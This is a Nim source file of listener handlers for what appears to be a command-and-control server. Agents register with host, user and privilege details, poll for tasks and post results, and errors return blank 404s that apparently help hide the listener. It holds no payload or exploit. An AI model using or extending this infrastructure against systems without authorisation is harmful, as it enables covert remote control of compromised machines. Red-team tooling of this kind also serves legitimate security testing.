import prologue, nanoid, json
import sequtils, strutils, times

import ../[types]
import ../agent/agent

proc error404*(ctx: Context) {.async.} = 
    resp "", Http404

#[
    POST /{listener-uuid}/register
    Called from agent to register itself to the conquest server
]# 
proc register*(ctx: Context) {.async.} = 

    # Check headers
    # If POST data is not JSON data, return 404 error code
    if ctx.request.contentType != "application/json": 
        resp "", Http404
        return

    # The JSON data for the agent registration has to be in the following format
    #[
        {
            "username": "username",
            "hostname":"hostname",
            "domain": "domain.local",
            "ip": "ip-address",
            "os": "operating-system",
            "process": "agent.exe",
            "pid":  1234,
            "elevated": false.
            "sleep": 10
        }
    ]#  

    try: 
        let 
            postData: JsonNode = parseJson(ctx.request.body)
            agentRegistrationData: AgentRegistrationData = postData.to(AgentRegistrationData)
            agentUuid: string = generate(alphabet=join(toSeq('A'..'Z'), ""), size=8)
            listenerUuid: string = ctx.getPathParams("listener")
            date: DateTime = now()

        let agent: Agent = newAgent(agentUuid, listenerUuid, date, agentRegistrationData) 
        
        # Fully register agent and add it to database
        if not agent.register(): 
            # Either the listener the agent tries to connect to does not exist in the database, or the insertion of the agent failed
            # Return a 404 error code either way
            resp "", Http404
            return 

        # If registration is successful, the agent receives it's UUID, which is then used to poll for tasks and post results
        resp agent.name

    except CatchableError:
        # JSON data is invalid or does not match the expected format (described above)
        resp "", Http404

    return

#[
    GET /{listener-uuid}/{agent-uuid}/tasks
    Called from agent to check for new tasks
]#
proc getTasks*(ctx: Context) {.async.} = 
    
    let 
        listener = ctx.getPathParams("listener")
        agent = ctx.getPathParams("agent")
    
    let tasksJson = getTasks(listener, agent)
    
    # If agent/listener is invalid, return a 404 Not Found error code 
    if tasksJson == nil: 
        resp "", Http404

    # Return all currently active tasks as a JsonObject
    resp jsonResponse(tasksJson)


#[
    POST /{listener-uuid}/{agent-uuid}/{task-uuid}/results
    Called from agent to post results of a task

]#
proc postResults*(ctx: Context) {.async.} = 
    
    let 
        listener = ctx.getPathParams("listener")
        agent = ctx.getPathParams("agent")
        task = ctx.getPathParams("task")
    
    # Check headers
    # If POST data is not JSON data, return 404 error code
    if ctx.request.contentType != "application/json": 
        resp "", Http404
        return

    try: 
        let 
            taskResultJson: JsonNode = parseJson(ctx.request.body)
            taskResult: TaskResult = taskResultJson.to(TaskResult)
        
        # Handle and display task result
        handleResult(listener, agent, task, taskResult)

    except CatchableError:
        # JSON data is invalid or does not match the expected format (described above)
        resp "", Http404

    return